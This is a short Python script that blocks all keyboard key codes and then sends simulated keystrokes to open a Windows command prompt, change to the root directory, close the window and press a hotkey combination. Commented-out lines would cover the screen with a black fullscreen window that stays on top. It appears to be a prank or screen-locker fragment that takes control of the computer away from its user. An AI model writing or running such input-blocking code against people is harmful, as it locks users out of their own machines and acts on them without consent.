import time
import keyboard
import tkinter as tk


# window = tk.Tk()
# window.configure(bg="black")
# window.wm_attributes("-fullscreen", True)
# window.wm_attributes("-topmost", True)
# window.update()

for i in range (0,255):
    keyboard.block_key(i)

keyboard.press_and_release("win+r")
time.sleep(.1)
keyboard.write("cmd")
time.sleep(.1)
keyboard.press_and_release("enter")
time.sleep(.4)

keyboard.write("cd /")
keyboard.press_and_release("enter")
time.sleep(.5)


keyboard.press_and_release("alt+f4")
time.sleep(.1)


keyboard.press_and_release("ctrl+alt+print screen")